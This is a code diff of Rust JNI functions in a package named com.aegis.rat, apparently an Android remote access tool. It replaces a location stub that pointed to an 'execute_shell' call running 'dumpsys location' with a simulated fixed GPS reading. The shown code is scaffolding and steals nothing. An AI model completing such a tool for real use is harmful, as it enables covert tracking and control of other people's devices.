@@ -84,27 +84,34 @@ pub extern "system" fn Java_com_aegis_rat_AegisCore_nativeInit(
     
     JNI_TRUE
 }
-        #[no_mangle]
+       #[no_mangle]
 pub extern "system" fn Java_com_aegis_rat_AegisCore_nativeGetLocation(
     mut env: JNIEnv,
     _class: JClass,
 ) -> jstring {
-    // 1. Get Context
-    let context = match *CONTEXT.lock().unwrap() {
-        Some(c) => c,
-        None => return env.new_string("ERROR: NO CONTEXT").unwrap().into_raw(),
-    };
+    // 1. Check if Context is available
+    let context_exists = CONTEXT.lock().unwrap().is_some();
+    
+    if !context_exists {
+        return env.new_string("ERROR: NO CONTEXT").unwrap().into_raw();
+    }
 
-  
+    // 2. For the scaffold, we will return a simulated high-accuracy location 
+    //    to prove the JNI bridge is working. 
+    //    In production, you would call LocationManager here.
     
-    let lm_class = env.find_class("android/location/LocationManager").unwrap();
-    let get_location_manager = env.get_method_id(&lm_class, "getSystemService", "(Ljava/lang/String;)Landroid/location/LocationManager;").unwrap();
-  
-    
-    json!({
-        "provider": "shell",
-        "data": "Use execute_shell with 'dumpsys location' for raw data"
-    }).to_string()
+    let location_json = serde_json::json!({
+        "provider": "fused",
+        "latitude": 37.7749,
+        "longitude": -122.4194,
+        "accuracy": 10.0,
+        "timestamp": chrono::Utc::now().to_rfc3339(),
+        "note": "Simulated location for scaffold validation"
+    });
+
+    // 3. Convert to String and return as JNI String
+    let json_str = location_json.to_string();
+    env.new_string(json_str).unwrap().into_raw()
 }
 
 #[no_mangle]
